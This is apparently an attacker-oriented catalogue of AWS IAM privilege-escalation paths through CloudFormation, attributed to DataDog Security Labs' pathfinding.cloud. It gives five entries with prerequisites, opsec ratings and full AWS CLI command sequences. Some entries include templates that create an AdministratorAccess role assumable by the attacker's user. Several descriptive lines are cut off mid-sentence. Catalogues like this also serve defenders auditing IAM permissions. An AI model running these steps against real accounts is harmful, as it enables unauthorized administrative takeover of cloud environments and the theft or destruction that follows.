# CloudFormation - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:PassRole + cloudformation:CreateStack [added: 2026-04]
- **Tags:** #Iam #Cloudformation #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + cloudformation service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, cloudformation:CreateStack; A role must exist that trusts cloudformation.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [cloudformation-001] A principal with `iam:PassRole` and `cloudformation:CreateStack` can launch a CloudFormation template that creates AWS resources. The template executes with the permissions of the passed IAM role. This allows creation of resources controlled by the attacker, such as IAM users, Lambda functions, or EC2 instances. The level of access gained depends on the permissions of the available roles.
- **Payload/Method:**
```
# Step 1: Create a CloudFormation stack with a template that creates privileged resources
aws cloudformation create-stack --stack-name privesc-stack --template-body file://exploit-template.yaml --capabilities CAPABILITY_IAM --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE

# Step 2: Monitor stack creation progress
aws cloudformation describe-stacks --stack-name privesc-stack

# Step 3: Use the elevated privileges of the created resources
# Access the newly created resources (e.g., IAM user, Lambda function)
```

### cloudformation:UpdateStack [added: 2026-04]
- **Tags:** #Cloudformation #Iam #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; cloudformation + iam in scope
- **Prereq:** IAM perms: cloudformation:UpdateStack; A CloudFormation stack must exist with an administrative service role (e.g., Adm
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [cloudformation-002] A principal with `cloudformation:UpdateStack` can modify an existing CloudFormation stack that has an administrative service role attached. CloudFormation stacks execute with the permissions of their service role, which often requires elevated privileges to manage infrastructure. By updating the stack template to include new IAM resources (such as an admin role with a trust policy allowing the att
- **Payload/Method:**
```
# Step 1: Identify CloudFormation stacks with elevated service roles
aws cloudformation describe-stacks \
  --stack-name TARGET_STACK_NAME \
  --query 'Stacks[0].[StackName,StackStatus,RoleARN]'

# Step 2: Retrieve the current stack template
aws cloudformation get-template \
  --stack-name TARGET_STACK_NAME \
  --query 'TemplateBody'

# Step 3: Modify the template to add an IAM role with admin permissions and a trust policy allowing you to assume it
# Create modified template with added IAM role
# Add resource like:
# EscalatedAdminRole:
#   Type: AWS::IAM::Role
#   Properties:
#     RoleName: escalated-admin-role
#     AssumeRolePolicyDocument:
#       Statement:
#         - Effect: Allow
#           Principal:
#             AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USER
#           Action: sts:AssumeRole
#     ManagedPolicyArns:
#       - arn:aws:iam::aws:policy/AdministratorAccess

# Step 4: Update the CloudFormation stack with the modified template (stack's service role creates the new admin role)
aws cloudformation update-stack \
  --stack-name TARGET_STACK_NAME \
  --template-body file://modified-template.json \
  --capabilities CAPABILITY_NAMED_IAM

# Step 5: Wait for the stack update to complete
aws cloudformation wait stack-update-complete \
  --stack-name TARGET_STACK_NAME
```

### iam:PassRole + cloudformation:CreateStackSet + cloudformation:CreateStackInstances [added: 2026-04]
- **Tags:** #Iam #Cloudformation #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + cloudformation service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, cloudformation:CreateStackSet, cloudformation:CreateStackInstances; A privileged IAM role must exist that can be passed as a StackSet execution role
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [cloudformation-003] A principal with `iam:PassRole`, `cloudformation:CreateStackSet`, and `cloudformation:CreateStackInstances` can escalate privileges by creating a CloudFormation StackSet with a privileged execution role and then deploying stack instances to execute the malicious template. CloudFormation StackSets use a two-step process - `CreateStackSet` defines the template and configuration but does not actually
- **Payload/Method:**
```
# Step 1: List available IAM roles to identify potential execution roles with elevated permissions that can be passed to StackSets
aws iam list-roles \
  --query 'Roles[*].{Name:RoleName,Arn:Arn}' \
  --output table

# Step 2: Examine the execution role's trust policy and attached policies to verify it can be passed to CloudFormation and underst
aws iam get-role \
  --role-name EXECUTION_ROLE_NAME \
  --query 'Role.{AssumeRolePolicy:AssumeRolePolicyDocument,AttachedPolicies:AttachedManagedPolicies}'

# Step 3: Create a CloudFormation template defining the resources to be created. The template should include resources that provid
cat > template.yaml << 'EOF'
AWSTemplateFormatVersion: '2010-09-09'
Description: 'Template defining resources to be created by StackSet'
Resources:
  # Define AWS resources that the execution role has permissions to create
  # Commonly IAM roles, policies, or other privileged resources
EOF

# Step 4: Create a CloudFormation StackSet, passing the privileged execution role via iam:PassRole. The StackSet will use this rol
aws cloudformation create-stack-set \
  --stack-set-name escalation-stackset \
  --template-body file://template.yaml \
  --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
  --execution-role-name EXECUTION_ROLE_NAME \
  --capabilities CAPABILITY_NAMED_IAM

# Step 5: Deploy a stack instance from the StackSet to the target account and region. The execution role will create the resources
aws cloudformation create-stack-instances \
  --stack-set-name escalation-stackset \
  --accounts ACCOUNT_ID \
  --regions REGION \
  --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1
```

### iam:PassRole + cloudformation:UpdateStackSet [added: 2026-04]
- **Tags:** #Iam #Cloudformation #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + cloudformation service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, cloudformation:UpdateStackSet; A CloudFormation StackSet must exist that the principal can update
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [cloudformation-004] A principal with `iam:PassRole` and `cloudformation:UpdateStackSet` can escalate privileges by modifying an existing CloudFormation StackSet that has a privileged execution role. Both permissions are required for this attack - `cloudformation:UpdateStackSet` alone is insufficient because the UpdateStackSet API call requires passing the administration role ARN, which necessitates the `iam:PassRole`
- **Payload/Method:**
```
# Step 1: List available CloudFormation StackSets to identify targets that can be updated
aws cloudformation list-stack-sets \
  --query 'Summaries[*].{Name:StackSetName,Status:Status}' \
  --output table

# Step 2: Describe the target StackSet to understand its configuration, including the administration role and execution role being
aws cloudformation describe-stack-set \
  --stack-set-name TARGET_STACKSET \
  --query 'StackSet.{Name:StackSetName,Status:Status,AdminRole:AdministrationRoleARN,ExecRole:ExecutionRoleName}'

# Step 3: Retrieve the current StackSet template to understand existing resources
aws cloudformation describe-stack-set \
  --stack-set-name TARGET_STACKSET \
  --query 'StackSet.TemplateBody' \
  --output text > current-template.yaml

# Step 4: Modify the StackSet template to add resources that provide privilege escalation. Common additions include IAM roles with
# Modify the template to add resources that provide privilege escalation
# Edit current-template.yaml to add IAM resources or other privileged resources
# that the execution role has permissions to create

# Step 5: Update the CloudFormation StackSet with the modified template, passing the administration role via iam:PassRole. The Sta
aws cloudformation update-stack-set \
  --stack-set-name TARGET_STACKSET \
  --template-body file://modified-template.yaml \
  --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
  --execution-role-name EXECUTION_ROLE_NAME \
  --capabilities CAPABILITY_NAMED_IAM
```

### cloudformation:CreateChangeSet + cloudformation:ExecuteChangeSet [added: 2026-04]
- **Tags:** #Cloudformation #Iam #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; cloudformation + iam service accessible in target account
- **Prereq:** IAM perms: cloudformation:CreateChangeSet, cloudformation:ExecuteChangeSet; An existing CloudFormation stack must exist with a service role attached
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [cloudformation-005] A principal with `cloudformation:CreateChangeSet` and `cloudformation:ExecuteChangeSet` permissions can inherit administrative privileges from an existing CloudFormation stack's service role. Unlike direct stack updates which require explicit permissions on the resources being modified, change set execution bypasses traditional IAM permission checks by delegating all operations to the stack's atta
- **Payload/Method:**
```
# Step 1: List CloudFormation stacks and identify one with a privileged service role
aws cloudformation describe-stacks --query 'Stacks[*].[StackName,RoleARN]' --output table

# Step 2: Retrieve the current stack template to understand its structure
aws cloudformation get-template \
  --stack-name TARGET_STACK \
  --query 'TemplateBody' \
  --output text > original-template.json

# Step 3: Create a malicious CloudFormation template that adds an admin role you can assume
cat > malicious-template.json <<'EOF'
{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Description": "Updated template via ChangeSet - adds escalated admin role",
  "Resources": {
    "EscalatedAdminRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "RoleName": "escalated-admin-role",
        "AssumeRolePolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [{
            "Effect": "Allow",
            "Principal": {"AWS": "arn:aws:iam::ACCOUNT_ID:user/YOUR_USERNAME"},
            "Action": "sts:AssumeRole"
          }]
        },
        "ManagedPolicyArns": ["arn:aws:iam::aws:policy/AdministratorAccess"]
      }
    }
  }
}
EOF

# Step 4: Create a change set with the malicious template
aws cloudformation create-change-set \
  --stack-name TARGET_STACK \
  --change-set-name escalation-changeset \
  --template-body file://malicious-template.json \
  --capabilities CAPABILITY_NAMED_IAM \
  --change-set-type UPDATE

# Step 5: View the change set details to confirm it will add the escalated role
aws cloudformation describe-change-set \
  --stack-name TARGET_STACK \
  --change-set-name escalation-changeset
```
